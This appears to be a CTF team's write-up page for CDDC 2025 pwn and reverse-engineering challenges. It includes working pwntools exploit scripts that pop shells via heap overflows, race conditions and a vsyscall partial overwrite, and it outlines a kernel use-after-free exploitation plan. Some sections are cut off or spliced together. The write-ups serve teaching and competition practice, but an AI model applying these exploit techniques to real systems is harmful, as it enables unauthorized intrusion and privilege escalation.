Check out the full list of challenges & writeups done by our club [here](https://nusgreyhats.org/cddc/2025)!

## Pwn (Qualifiers) - Account Protocol

After some reversing, we can identify the following operations for the program.

```py
def create_account(account_type, data):
    """Opcode 0: Create account
    account_type: 0 = binary/wide string, 1 = regular string
    Returns: account_id (0-15) or -1 on failure
    """
    payload = p8(0) + p8(account_type) + data
    s(payload)

def delete_account(account_id):
    """Opcode 1: Delete account (op_1)"""
    payload = p8(1) + p8(account_id)
    s(payload)

def update_account(account_id, account_type, data):
    """Opcode 2: Update account data
    account_type: 0 = binary/wide string, 1 = regular string
    """
    payload = p8(2) + p8(account_id) + p8(account_type) + data
    s(payload)

def display_account(account_id):
    """Opcode 3: Display account data"""
    payload = p8(3) + p8(account_id)
    s(payload)

def execute_command():
    """Opcode 255: Execute system command"""
    payload = p8(255)
    s(payload)
```

We basically get a CRUD menu where we can create, read, update and delete accounts. The accounts hold an `account_type` _(wide or regular string)_ and an `account_name` _(up to 254 characters)_ and is referred to via an incrementing `account_id` _(total of 16 accounts allowed)_.

### memory allocation

Upon allocation of a new account, it will allocate two memory chunks using their custom memory alloactor. One to store an `account_metadata` struct and the other to store the raw `account_name` data.

```c
struct account
{
  uint8_t type; // wide_str = 0, regular_str = 1
  uint8_t ref_count;
  char *data_ptr; // pointer to account_name
};
acc_metadata = (struct account_metadata *)custom_malloc(0x18u);
acc_data = (char *)custom_malloc(sz);
```

The custom allocator stores all the memory chunks adjacent to one another in its own `mmap'ed` buffer. Unlike regular `malloc`, there is no metadata that comes with each memory chunk _(such as the chunk size etc)_.

### wide string vs regular string

The program differentiates between a wide string and a regular string. Unlike the regular `strlen` or `strncpy` that is used for regular strings, the program implements its own functions to implement the equivalent wide-string functions.

```c
size_t wide_strlen(_BYTE *wstr)
{
  bool v2; // [rsp+1h] [rbp-19h]
  size_t length; // [rsp+Ah] [rbp-10h]

  for ( length = 0LL; ; ++length )
  {
    v2 = 1;
    if ( !*wstr )
      v2 = wstr[1] != 0;
    if ( !v2 )
      break;
    wstr += 2;
  }
  return length;
}

void copy_wide_string(_BYTE *dst, _BYTE *src)
{
  bool v2; // [rsp+1h] [rbp-21h]

  while ( 1 )
  {
    v2 = 1;
    if ( !*src )
      v2 = src[1] != 0;
    if ( !v2 )
      break;
    *dst = *src;
    dst[1] = src[1];
    dst += 2;
    src += 2;
  }
  *dst = 0;
  dst[1] = 0;
}
```

### the attack target

One of the functionality for the program is to run `system(command)` where **command** is a hardcoded-string that is allocated after running the command for the first time.

If we are able to **overwrite the command on the heap** to `/bin/sh`, we can eventually pop a shell.

### the bug

When calling `update_account`, you can modify an account type between a regular string and wide-string.

- Create a regular account of `account_name` with an even-length size _(i.e. 20)_. 
- If we convert `account` into a wide-string, it will cause a null-byte overflow when writing the 2 null-byte terminator for the wide-string.

If we can arrange the custom-heap such that the null-byte overflows into a meta-data chunk, we can write a null byte to an adjacent `account_metadata->type`.

This means that we can use the overflow to **change a regular string type into a wide string type**, despite it only having a single null byte terminator.

> When updating an account, it determines the size of the `account_data` by doing a **strlen/wide_strlen** based on the type of the account data.
>
> This means that if we convert a regular string to a wide-string, the **wide_strlen** will **read into the next adjacent chunk due to the lack of a wide-string terminator** _(2 null-bytes)_. This causes **wide_strlen** to return a larger value and allows us to overwrite the adjacent heap chunk.
{:.prompt-tip}

### the exploit

In order to get this to work, we want to arrange our heap into this state.

- Allocate Account A _(regular-str)_
- Allocate Account B _(regular-str)_
- Allocate COMMAND

```
meta A
________
data A
________
meta B
________
data B
________
CMD
```

1. `data A` null-byte overflows into `meta B` to convert it to a **wide-string**.
2. `data B` overflows into `command` to overwrite it.
3. run `system(command)` to get our shell.

```py
from pwn import *

elf = context.binary = ELF("./account")
libc = elf.libc
if args.REMOTE:
	p = remote("cddc2025-challs-nlb-579269aea83cde66.elb.ap-southeast-1.amazonaws.com", 7777)
else:
	p = elf.process()

sla = lambda a, b: p.sendlineafter(a, b)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
s = lambda a: p.send(a)
rl = lambda: p.recvline()
ru = lambda a: p.recvuntil(a)

def create_account(account_type, data):
    """Opcode 0: Create account
    account_type: 0 = binary/wide string, 1 = regular string
    Returns: account_id (0-15) or -1 on failure
    """
    payload = p8(0) + p8(account_type) + data
    s(payload)

def delete_account(account_id):
    """Opcode 1: Delete account (op_1)"""
    payload = p8(1) + p8(account_id)
    s(payload)

def update_account(account_id, mode, data):
    """Opcode 2: Update account data
    mode: 0 = binary/wide string, 1 = regular string
    """
    payload = p8(2) + p8(account_id) + p8(mode) + data
    s(payload)

def display_account(account_id):
    """Opcode 3: Display account data"""
    payload = p8(3) + p8(account_id)
    s(payload)

def execute_command():
    """Opcode 255: Execute system command"""
    payload = p8(255)
    s(payload)

# setup heap state
create_account(1, b"A"*30)
pause()
create_account(1, b"B"*1)
pause()
execute_command()
pause()

# null-byte overflow
update_account(0, 0, b"D"*30)
pause()

# overflow
update_account(1, 0, b"D /bin/bash")
pause()

# run command
execute_command()
pause()

p.interactive()
```


## Pwn (Qualifiers) - Workout

Upon running the program, we are shown a long interactive menu.

```c
*----------*
| WORK OUT |
*----------*

 1. New exercise
 2. List exercises
 3. Delete exercise
 4. New routine
 5. List routines
 6. Delete routine
 7. Set exercise to routine
 8. Remove exercise from routine
 9. Swap exercises in routine
10. View routine details
 0. Exit
```

A tl;dr of how this works is 

- Uses a custom sophisticated memory allocator that allows for memory reuse and memory coalescing.
- Create up to 10 `Exercise` objects that holds an `char exercise_name[38]`
- Create up to 7 `Routine` objects that holds up to 10 `Exercise` objects.
- Each `Exercise` object uses a `uint8 refcount` to determine when it should be free-ed.

The memory allocator is used to allocate `Routine` and `Exercise` objects.

```c
struct Routine
{
  void *vtable;
  unsigned __int8 day;
  void *exercises[10];
}; // size 0x60

struct Exercise
{
  ExerciseVTable *vtable;
  unsigned __int8 refcount;
  unsigned __int8 id;
  char name[38];
}; // size 0x30
```

### the bug

```c
__int64 xor_swap_routine_entries(
        __int64 this,
        WorkoutRoutine *routine,
        unsigned __int8 ex_id_1,
        unsigned __int8 ex_id_2)
{
  // ... truncated ...
  if ( ex_id_1 < 0xAu && ex_id_2_ < 0xAu )
  {
    ex1 = &routine->exercise_slots[ex_id_1_];
    ex2 = &routine->exercise_slots[ex_id_2_];   // if v15 == v14, then v8 == v9. This nulls the exercise_slot.
    *ex1 = (*ex1 ^ *ex2);
    *ex2 = (*ex2 ^ *ex1);
    *ex1 = (*ex1 ^ *ex2);
    create_success_result();
    wrap_success_result(a1);
  }
  // ... truncated ...
}
```

1. Adding an `Exercise` to `Routine` increases the `Exercise->refcount` by 1
2. Swapping the `Exercise` with itself in `Routine` removes the pointer from the `Routine`
3. Repeat Step 1 **256 times** to overflow `Exercise->refcount` back to 1.
4. Delete the `Exercise` from the `Routine` which calls `destruct_exercise` to decrement `Exercise->refcount` to 0 which results in it getting free-ed.
5. Since we did not delete the `Exercise`, we still hold a pointer to the free-ed `Exercise` object and have a UAF.

### the exploit

After we have the UAF, we can allocate another `Routine` to re-use the free-ed memory. Now we have an overlapping `Exercise` and `Routine`.

We can **delete** and re-**allocate** the exercise to overwrite the `Routine->exercises[]` pointers.

This gives us an arbitrary read and arbitrary free. We can create fake chunks to be free-ed and overwrite the `vtable` entry to point to a `one_gadget` to pop a shell.

## Pwn - U-boot

> The boot process is fast. Maybe a little too fast.
> 
> If your timing is just right, you might slip something in before the system notices.
> Can you catch the gap and make your move?

We are given a single program called `uboot`.

> Traditionally, `uboot` is a boot loader for embedded systems that is used to launch the kernel. This challenge program **is NOT** a real `uboot` program but is just a simple re-implementation of it.
{:.prompt-tip}

Upon running the program, we are introduced with a login prompt, followed by the booting of some ELF program that we do not seem to have.

```
$ ./uboot
U-Boot 2024.03.12 <Jun 13 2025 - 12:00:00>

open: No such file or directory

Press Enter to U-Boot login.

Login: a
Password: b
Authentication failed. Just Booting.
Error: no ELF loaded. Use 'load' first.
```

### Reverse-Engineering the `uboot` program

We can throw `uboot` into IDA to decompile the program and see what it is doing under the hood.

This snippet of code shows us that it is trying to read and load an ELF file named `nvr_kernel`. We do not have access to this file locally, but it seems to exist on the remote server.

```c
  s1_1[0] = "load";
  s1_1[1] = "./nvr_kernel";
  s1_1[2] = 0LL;
  load_elf(s1_1);
  puts("\nPress Enter to U-Boot login.");
```

Next, we can look at the `login` function where we see that the `uboot` program actually uses hardcoded credentials.

```c
_BOOL8 login()
{
  char s[64]; // [rsp+0h] [rbp-90h] BYREF
  char s1[72]; // [rsp+40h] [rbp-50h] BYREF
  unsigned __int64 v3; // [rsp+88h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Login: ");
  if ( !fgets(s, 64, stdin) )
    return 0LL;
  s[strcspn(s, "\r\n")] = 0;
  printf("Password: ");
  if ( !fgets(s1, 64, stdin) )
    return 0LL;
  s1[strcspn(s1, "\r\n")] = 0;
  return !strcmp(s, "admin") && !strcmp(s1, "uboot4dmin123!@");
}
```

### Using the `uboot` menu to read `nvr_kernel`

We can use this hardcoded credentials to connect to the remote server.

```sh
$ nc chal.h4c.cddc2025.xyz 11835 # run this on remote
U-Boot 2024.03.12 <Jun 13 2025 - 12:00:00>

Loaded 27880 bytes into memory # we note that nvr_kernel has 27880 bytes

Press Enter to U-Boot login.

Login: admin
Password: uboot4dmin123!@
Authentication successful. Welcome to U-Boot Simulator.

U-Boot Simulator
Type 'help' for commands.

uboot> help
Available commands:
  help                 - this help
  exit                 - quit simulator
  md <addr> <count>    - memory display (hex)
  mw <addr> <value>    - memory write (byte)
  setenv <var> <val>   - set environment variable
  printenv             - show env list
  boot                 - execute loaded KERNEL
  boota                - boot Android system
```

As we can see, the boot menu contains some useful commands such as `md` and `mw` _(which allows us to read/write memory)_.

By reverse-engineering the program, we note that `mw` is actually not implemented and it does not actually write anything to memory.

Instead, `md 0 27880` can help us to read the entire `nvr_kernel` from memory.

```py
# nvr_hexdump.txt contains the output from the `md 0 27880` command
with open("./nvr_hexdump.txt", "rb") as f:
    x = f.readlines()

# convert the hex dump to raw bytes basically
elf = b''.join([bytes.fromhex(i.split(b": ")[1].decode().replace("\n", "").replace(" ", "")) for i in x])

with open("./nvr_elf", "wb") as f:
    f.write(elf)
```

### Reverse-Engineering `nvr_kernel` binary

Without going too much into the details, the `nvr_kernel` shell provides us with a few commands that we can run. One of the more interesting commands is `print device`

```c
unsigned __int64 __fastcall print_device(int *uid)
{
  FILE *stream; // [rsp+18h] [rbp-118h]
  char s[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v4; // [rsp+128h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  puts("This is CDDC NVR System");
  if ( !*uid )
  {
    stream = fopen("flag", "r");
    if ( stream )
    {
      puts("=== FLAG ===");
      while ( fgets(s, 256, stream) )
        fputs(s, stdout);
      fclose(stream);
      puts("\n============");
    }
    else
    {
      printf("[!] Flag file not found: %s\n", "flag");
    }
  }
  putchar(10);
  return v4 - __readfsqword(0x28u);
}
```

If our `uid` is `0` _(which typically indicate root permissions)_, the flag will be printed to us.

Interestingly, one of the commands that we have access to allows us to **reboot the nvr_kernel**.

```c
unsigned __int64 __fastcall reboot_nvr_kernel(int *uid)
{
  pthread_t newthread; // [rsp+10h] [rbp-10h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  if ( pthread_create(&newthread, 0LL, (void *(*)(void *))reboot_nvr_kernel_internal, uid) )
    perror("pthread_create");
  else
    pthread_detach(newthread);
  return v3 - __readfsqword(0x28u);
}

void *__fastcall reboot_nvr_system(int *uid)
{
  int v2; // [rsp+14h] [rbp-Ch]

  v2 = *uid;
  *uid = 0;
  puts("Shutdown NVR system...");
  sub_247F();
  *uid = v2;
  puts("Boot complete.\n");
  return 0LL;
}
```

This is done by spawning a new thread which sets `uid` to 0 while the system is still booting.

Since this is done in a separate thread, we can still run commands on the main thread.

**This creates a race condition where we can run `print device` with `uid = 0` while the kernel is rebooting.**

### Solve script

```py
from pwn import *

p = remote("chal.h4c.cddc2025.xyz", 11835)

p.sendlineafter(b"login.", b"")
p.sendlineafter(b"Login:", b"admin")
p.sendlineafter(b"Password:", b"uboot4dmin123!@")

# we need to set init=/bin/sh to get an interactive nvr_system shell
p.sendlineafter(b"uboot>", b'setenv bootargs init=/bin/sh')
p.sendlineafter(b"uboot>", b"boot")

# race condition, reboot and print device at the same time
p.sendlineafter(b"\n#", b"reboot")
p.sendlineafter(b"\n#", b"print device")

p.interactive()
```

## Pwn - Eclipse

> **This writeup is incomplete and still work-in-progress.**
{:.prompt-warning}

_This is a 300 points kernel pwn challenge that I did not manage to solve during the CTF. I managed to get RIP control but did not manage to successfully leak with `msgmsg`_.

We are provided with a kernel module `eclipse.ko` that is loaded into the kernel on boot.

We have to exploit this kernel module to obtain root permissions and read the flag.

Conveniently, the source code is also given to us in `eclipse.c`.

### Kernel Module Functionalities

The kernel module exposes to us some heap functionalities `alloc`, `read`, `write`, `realloc` that we can call from userspace.

```c
static long eclipse_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct user_req req;

    if (!arg)
    {
        printk(KERN_ERR "eclipse_ioctl: invalid user request\n");
        return -EINVAL;
    }

    if (copy_from_user(&req, (void __user *)arg, sizeof(req)))
    {
        printk(KERN_ERR "eclipse_ioctl: copy_from_user failed\n");
        return -EINVAL;
    }

    switch (cmd)
    {
        case CMD_ALLOC:
            return eclipse_alloc(&req);
        case CMD_SHOW:

            return eclipse_realloc(&req);

The `eclipse_alloc` function allocates a kheap chunk between size 64 and 1024.

```c
static int eclipse_alloc(const struct user_req *req)
{
    if (req->size < 64 || req->size > 1024)
    {
        printk(KERN_ERR "eclipse_alloc: invalid allocation size\n");
        return -EINVAL;
    }

    eclipse->data = kmalloc(req->size, GFP_KERNEL);
    if (!eclipse->data)
    {
        printk(KERN_ERR "eclipse_alloc: allocation failed\n");
        return -ENOMEM;
    }

    eclipse->size = req->size;
    spin_lock_init(&eclipse->lock);

    return 0;
}
```

`eclipse_read` does nothing and is simply a placeholder :/.

```c
static ssize_t eclipse_read(const struct user_req *req)
{
    printk(KERN_INFO "eclipse_read called\n");
    return 0;
}
```

`eclipse_write` reads from userspace and writes into the kheap chunk. 

```c
static ssize_t eclipse_write(const struct user_req *req)
{
    unsigned long flags;

    spin_lock_irqsave(&eclipse->lock, flags);

    if (req->size < 0 || req->size > eclipse->size)
    {
        spin_unlock_irqrestore(&eclipse->lock, flags);
        printk(KERN_ERR "eclipse_write: invalid buffer size\n");
        return -EINVAL;
    }

    if (req->data)
    {
        spin_unlock_irqrestore(&eclipse->lock, flags);
        if (copy_from_user(eclipse->data, req->data, req->size)) // not protected by mutex
        {
            printk(KERN_ERR "eclipse_write: copy_from_user failed\n");
            return -EFAULT;
        }
        spin_lock_irqsave(&eclipse->lock, flags);
    }
    else
    {
        spin_unlock_irqrestore(&eclipse->lock, flags);
        printk(KERN_ERR "eclipse_write: invalid buffer\n");
        return -EINVAL;
    }

    spin_unlock_irqrestore(&eclipse->lock, flags);
    return 0;
}
```

`eclipse_realloc` free-s the old buffer and reallocates a new one.

```c
static ssize_t eclipse_realloc(const struct user_req *req)
{
    unsigned char *new_data, *old_data;

    if (req->size < 64 || req->size > 1024)
    {
        printk(KERN_ERR "eclipse_realloc: invalid buffer size\n");
        return -EINVAL;
    }

    if (req->size != eclipse->size)
    {
        new_data = kmalloc(req->size, GFP_KERNEL);
        if (!new_data)
            return -ENOMEM;

        spin_lock_irq(&eclipse->lock);
        old_data = eclipse->data;
        eclipse->data = new_data;
        eclipse->size = req->size;
        spin_unlock_irq(&eclipse->lock);
        kfree(old_data);
    }

    return 0;
}
```

### Vulnerability Analysis

We can note that there is some form of synchronization being done in the program to prevent race conditions, however there is still a race condition bug in `eclipse_write` and `eclipse_realloc`.

The spinlock is unlocked right before the data is copied into the kernel heap buffer in `eclipse_write`.

```c
        spin_unlock_irqrestore(&eclipse->lock, flags);
        if (copy_from_user(eclipse->data, req->data, req->size)) // not protected by mutex
```

In `eclipse_realloc`, the spinlock is unlocked once again before the kernel heap buffer is free-ed.

The improper use of spinlock gives rise to the potential to trigger a Use-After-Free with the following steps

1. `eclipse_write` acquire the `eclipse->data` pointer to store the data to be copied from userspace.
2. Before the write is done, `eclipse_realloc` will allocate a new pointer and free the old `eclipse->data` pointer.
3. Since `eclipse_write` is still holding onto the old free-ed `eclipse->data` pointer, we will write into free-ed memory.

#### Kernel Protections

Before we dive into our exploit strategy, we have to consider what kernel protections are enabled. Looking at `start.sh`, we can tell that 

- `SMAP` disabled
- `SMEP` disabled
- `KPTI` enabled _(cannot access userspace pages despite lack of SMEP or SMAP)_
- Single core _(difficult to win race conditions)_

```bash
qemu-system-x86_64 \
-m 2G \
-kernel ./bzImage \
-drive file=./rootfs.img,format=raw,index=0,media=disk \
-append "root=/dev/sda rw console=ttyS0 oops=panic panic=1 pti=on kaslr init=/init" \
-netdev user,id=net0,hostfwd=tcp::10022-:22,hostfwd=tcp::9000-:9000 \
-device e1000,netdev=net0,id=nic0 \
-nographic \
-cpu qemu64 \
-s
```

Additionally, we can also use `kchecksec` from [bata24/gef](https://github.com/bata24/gef) to look at other kernel protections that are configured into the kernel at compile-time.

```sh
# userfaultfd is disabled
gef> kchecksec
# ...
vm.unprivileged_userfaultfd             : Syscall unsupported (userfaultfd syscall: Disabled)
kernel.unprivileged_bpf_disabled        : Syscall unsupported (bpf syscall: Disabled)
# ...

$ ls /dev/fuse
/dev/fuse # FUSE filesystem is enabled. This is important later.
```


> To make your debugging experience better, you should use [extract-vmlinux](https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux) script to extract `vmlinux` from `bzImage`, and use [vmlinux-to-elf](https://github.com/marin-m/vmlinux-to-elf) to extract debug information from `vmlinux`.

### Getting RIP Control

#### Winning Race Conditions

As mentioned before, since the kernel is only running with one core, it will be difficult to win race conditions just by running multiple threads since only one thread can run at a time.

As such, we would have to utilize some commonly known techniques such as [userfaultfd](https://pawnyable.cafe/linux-kernel/LK04/uffd.html) or [FUSE](https://pawnyable.cafe/linux-kernel/LK04/fuse.html) that can help us to pause kernel threads when certain conditions are met.

As shown before, `userfaultfd` is not supported in this kernel, but `FUSE` is.

**FUSE Filesystem**

> [FUSE](https://en.wikipedia.org/wiki/Filesystem_in_Userspace) allows us to create filesystem in userspace without needing to re-write code in the kernel. The kernel would simply redirect filesystem calls back to the userspace.
{:.prompt-tip}

What this means for us pwners is that we are able to define a set of callback functions that will be triggered when anything tries to interact with our filesystem.

In short, this is how we can use FUSE to block kernel threads and win race conditions:

1. Create a FUSE filesystem and register a `read_callback` that is triggered when file contents is read from the FUSE filesystem.
2. Use `mmap` to map the file into memory.
3. Do `eclipse_alloc` to allocate a buf, and `eclipse_write` to copy from the FUSE-backed memory into the kernel heap buffer.
4. When `copy_from_user` tries to read the FUSE-backed memory region _(aka tries to access contents of file in FUSE)_, it will pause the kernel thread and trigger `read_callback` in userspace.
5. In `read_callback`, we can trigger `eclipse_realloc` to free the pointer that we are currently about to copy into.
6. After the `read_callback` is complete, the write is done _(but the pointer has already been free-ed)_.
7. We have achieved a UAF!

This significantly simplifies our exploit as we no longer have to rely on unreliable race condition exploits that would frequently fail.

#### From Race Condition to RIP Control

We know that we are able to trigger a kernel UAF from our race condition. We can do so in any cache between the size kmalloc-64 and kmalloc-1024.

From hereonafter, there are many possible ways that we can get **RIP control** or even directly get **root privileges** through data-only exploits _(such as arbitrary write to `cred` struct or the famous `modprobe_path`)_.

My exploit attempts to use the `UAF` to control the `tty_struct` kheap structures to obtain RIP control.

#### Heap-Spraying

Since the kernel heap is often used by many different things at the same time, there might be many allocations and deallocations happening concurrently. As a result, we would need to spray our heap to improve the chances that one of our allocated objects will land in the UAF-ed object.
{:.prompt-tip}

>It is, of course, difficult for an attacker to get their hands on precisely the chunk of memory that is being mishandled in the kernel. When precision is not possible, sometimes brute force will do. Heap spraying involves allocating as many chunks of memory as possible, and writing the crafted data into each, in the hope of happening upon the right one. Given the way that the kernel's slab allocator works, the chances of succeeding are higher than one might expect.

Although we have gotten RIP control, we are only halfway there.

- Due to `KPTI`, we cannot jump back to userspace addresses and run arbitrary shellcode.
- Due to `KASLR`, we do not know an kernelspace addresses that we can execute/jump to.

We would need a leak to make use of this RIP control vector. _(and this was where i got stuck during the ctf, becauase skill issue)_

### Getting a KASLR leak

The most common way to obtain kernel leaks these days would be to abuse the `msg_msg` kheap structure to corrupt IPC message buffers to return arbtirary kernel heap memory. You can find a detailed writeup about it [here](https://syst3mfailure.io/wall-of-perdition/).

> Despite `msgmsg` being allocated with the `GFP_KERNEL_ACCOUNT` flag, it is still allocated into the same cache as our target eclipse chunk that is allocated with the `GFP_KERNEL` flag. This is because the `MEM_CG` security configuration is disabled. 
>
> Otherwise, we would need to do cross-cache to get UAF on a `msgmsg` chunk.
{:.prompt-tip}

Personally, this is my first time trying to utilize the `msg_msg` struct in a kernel exploit. The plan was as follows
1. Trigger use-after-free
2. Spray `msg_msg` objects with `MSG_COPY` flag
3. Overwrite the first 0x18 bytes to modify the mesasge text size (`m_ts`) to be larger than the actual message `m_ts`
4. Spray some kernel heap object to ensure that a known object is placed after our `msg_msg` buffer.
4. Read the corrupted message to obtain kernel leaks from the known object.

However this did not work and I found out that it was because `CONFIG_CHECKPOINT_RESTORE` configuration in the kernel was disabled, which disables the `MSG_COPY` flag. This creates a hugeeeee problem for us.

> It is important to note that in `recv_msg()` we use the `MSG_COPY` flag: overwriting the target object, we corrupted its `m_list.next` and `m_list.prev` fields, therefore if we don’t use `MSG_COPY`, `do_msgrcv()` will try to unlink the message from the queue, causing a crash.

This was ultimately where I got stuck in the CTF, preventing me from solving the challenge.

#### Getting a leak without MSG_COPY

Recall that we actually achieved our UAF reliable only after the page fault that was caused by accessing the FUSE page when `copy_from_user` is called to copy data from our userspace FUSE page into the kernel buffer?

> **`copy_from_user` does not copy the entire requested data all at once.**
> 
> Instead, it copies data one page at a time _(up to every `0x1000` address boundary)_ as it must handle page faults as it accesses user memory that may be swapped out or not yet mapped.
{:.prompt-tip}

Since overwriting the first 0x18 bytes of `msg_msg` causes it to crash during the unlinking process, we can simply trigger the FUSE page fault **AFTER** copying the 0x18 bytes into the original buffer (before the UAF).

Imagine our FUSE page is at `0x1337000` and we start copying from `0x1337000-0x18`, here's what would happen

1. `copy_from_user` will copy 0x18 bytes until the end of the page boundary _(up to 0x1337000)_.
2. `copy_from_user` tries to copy from `0x1337000 - 0x13378000`, but it hits a page fault due to the FUSE page and triggers `read_callback`
3. `read_callback` triggers `DO_REALLOC` which will free the current kheap buffer that we are writing to and spray `tty_struct` objects before returning to continue the copying.
4. `copy_from_user` will copy the `0x1337000 - 0x13378000` into the sprayed `tty_struct` object at an offset of 0x18, allowing us to write while skipping the first 0x18 bytes.

This would allow us to overwrite `m_ts` without corrupting the linked list pointers and crashing during unlinking process.

### Getting Root

Suppose we get our kernel heap leak, we can craft a `tty_struct` to run a ROP chain directly. You can refer to this [post](https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md#rip-hijacking-by-krop-on-tty_struct-itself) on the values that we can set in the struct.

In our ROP chain, we can commit root credentials to obtain root permissions.

```
commit_creds(&init_creds);
swapgs_restore_regs_and_return_to_usermode();
```

In the interest of time, I leave it up to the reader to implement the final exploit given the above primitives :)

### Reverse Engineering

The program is very straightforward. We have a simple buffer overflow with all protections enabled except the stack canary.

```c
// ❯ checksec prob
// [*] './CDDC/Finals/pwn/llama/chal/prob'
//     Arch:       amd64-64-little
//     RELRO:      Full RELRO

//     NX:         NX enabled
//     PIE:        PIE enabled
//     SHSTK:      Enabled
//     IBT:        Enabled
//     Stripped:   No

int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("[*] This CDDC 2025 Time Capsule");
  printf("[>] Input your comment: ");
  read(0, buf, 80uLL);
  return 0;
}

int win()
{
  char *env; // rax

  puts("[*] You WIN!!");
  env = getenv("HINT");
  return puts(env);
}
```

### Ideating our exploit strategy

Our goal is to call the `win` function, but it is non trivial to do so without knowing any LIBC or ELF address.

If we look at the stack at the point when we return from the `main` function, we can see that we are only able to achieve a partial overwrite on the libc address.

```sh
 ► 0x5637770f9281 <main+135>                      ret                                  <0x7fc5764f2d90; __libc_start_call_main+128>
──────────────────────────────────────────────────────────────────────────────────
pwndbg> tele $rsp # we can print the top of our stack
00:0000│ rsp 0x7ffcacd59d48 —▸ 0x7fc5764f2d90 (__libc_start_call_main+128) ◂— mov edi, eax
01:0008│     0x7ffcacd59d50 ◂— 0x0
02:0010│     0x7ffcacd59d58 —▸ 0x5637770f91fa (main) ◂— endbr64
```

In order to actually call the `win` function, we would want to do a partial overwrite of the `main` function to convert it to `win` and return there.

If we actually looked at the provdied Dockerfile, there is a hint given _(i did not notice this during the CTF...)_

```Dockerfile
# Docker host server's boot option setting:
# echo 'GRUB_CMDLINE_LINUX_DEFAULT="vsyscall=emulate"' >> /etc/default/grub
# reboot
```

The kernel is set to run with `vsyscall=emulate` configuration. If we do some research on this, we can find writeups like [this](https://nandynarwhals.org/hitbgsec2017-1000levels/#solving-the-pie-problem).

Essentially, there is a region of memory that is loaded at a fixed address called **vsyscall**. The purpose of this is to allow the kernel to run syscalls without leaving the userspace for efficiency purposes, by emulating some of the more commonly used syscalls such as `gettimeofday()` etc.

![vsyscall](vsyscall.png)

What this means for us is that we have a very useful `ret` gadget that we can use to fill the space between the stack until the `main` address and achieve our partial overwrite to call `win`.

### Solution

```py
from pwn import *
p = process("./prob")
p.send(b"A"*40 + p64(0xffffffffff600000)*2 + b"\xc9")
p.interactive()
```

## Reverse - Flag Checker

> Analyze the code, please find the right input!

This challenge is a typical CTF flag checker where we have to find the correct input to get the flag.

### Reverse-engineering the program

We can throw the program into IDA and analyze the main function.

As we can tell, our input should be 4000 characters long, and return `1` from the `check_flag_1` function.

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  int i; // [rsp+Ch] [rbp-10E4h]
  char s[16]; // [rsp+E0h] [rbp-1010h] BYREF
  unsigned __int64 v6; // [rsp+10E8h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  printf("Input correct value: ");
  if ( fgets(s, 4100, stdin) )
  {
    s[strcspn(s, "\n")] = 0;
    if ( strlen(s) == 4000 )
    {
      if ( (unsigned int)check_flag_1(s) )
      {
        printf("Congratulations! Flag is CDDC2025{");
        for ( i = 0; i <= 63; ++i )
          putchar(s[dword_73FC0[i]]);
        puts("}");
      }
      else
      {
        puts("Wrong :(");
      }
      return 0LL;
    }
    else
    {
      puts("Wrong :(");
      return 1LL;
    }
  }
  else
  {
    puts("Error reading input");
    return 1LL;
  }
}
```

We can look at `check_flag_1` function to see the constraints for the correct input.

```c
__int64 __fastcall check_flag_1(char *s)
{
  if ( ((unsigned __int8)*s ^ (unsigned __int8)byte_73020) == -78 )
    return check_flag_2(s);
  else
    return 0LL;
}
```

The `check_flag_1` function checks the first character of our input by doing a XOR operation.

As we continue to analyze the subsequent functions, we realize that there are **4000 functions that checks each character of the flag one at a time**. To retrieve the entire 4000 characters, we need to automate this.

### Ideating the solution

From IDA, we can tell that the first `check_flag` function is at `0x49773` and the last `check_flag` function is at `0x1490`.

Initially, I thought of 3 ways to do this

1. Brute-force character by character. We can tell if a character is correct if we have more code coverage / more code is executed.
2. We can use a symbolic execution engine like [angr](https://angr.io) to try and solve the constraints of our input.
3. We can write a parser to read the assembly instructions and convert it into equations that we can solve using [z3](https://github.com/Z3Prover/z3).

Option 1 would be difficult for me beacuse I am not familiar with any instrumentation engines like [pintool](https://www.intel.com/content/www/us/en/developer/articles/tool/pin-a-dynamic-binary-instrumentation-tool.html). Setting breakpoints by using a debugger might be too slow.

Option 2 would be the easiest to implement but difficult to get to work since we are prone to [path explosion](https://en.wikipedia.org/wiki/Path_explosion) if we try to get the execution engine to step through all 4000 functions without any extra instrumentation.

Option 3 is the most tedious and I simply was too lazy to do it

### Solving the challenge

I went along with the easiest to implement solution which is to use **angr**. However, to ensure that it does not encounter path explosion, I would have to solve each of the 4000 functions one at a time.

First, we extract the address of all 4000 checker functions.

```py
# idapython code to extract the address of all 4000 checker functions
end = 0x1490

funcs = []
tail = end

for i in range(4000):
    funcs.append(tail)
    x = [i.frm for i in XrefsTo(tail)][0]
    print(hex(x))
    tail = ida_funcs.get_func(x).start_ea

print(funcs)
```

Next, we write angr script to solve the functions one at a time.

```py
import angr
import claripy
import logging

addrs = [...] # addresses of 4000 checker functions. truncated for brevity

p = angr.Project("./prob")

inpt = [claripy.BVS(f"inpt_{i}", 8) for i in range(4000)]

correct = []

for i in range(0, len(addrs)-1):
    # we start a checker_function_n
    state = p.factory.blank_state(addr=0x400000+addrs[i])
    state.memory.store(0x1337000, claripy.Concat(*inpt))
    state.regs.rdi = 0x1337000
    mgr = p.factory.simulation_manager(state)
    # we try to reach checker_function_n+1
    mgr.explore(find=0x400000+addrs[i+1])
    # we solve for the character of the flag that allows us to pass the check
    correct.append(int(mgr.found[0].solver.eval(inpt[i])))
    print(i, bytes(correct))
```

After waiting 10 minutes or so, we obtain the input of 4000 characters, which we can pass into the program to get the flag.

In hindsight, I only needed to solve 64 of the characters that is used to form the flag. I did not notice this initially due to my excitement to write an angr script to solve the challenge.

This took me 4 attempts to solve this challenge.

I suspect that it did not work because it was not writing fast enough. The challenge was likely writing `0`s to the register faster than me.

As such, I decided to remove all `print` statements and irrelevant code in the while loop, and it worked.

If it still refused to work, I was ready to spawn 10 terminals to run the code 10 times. :\)
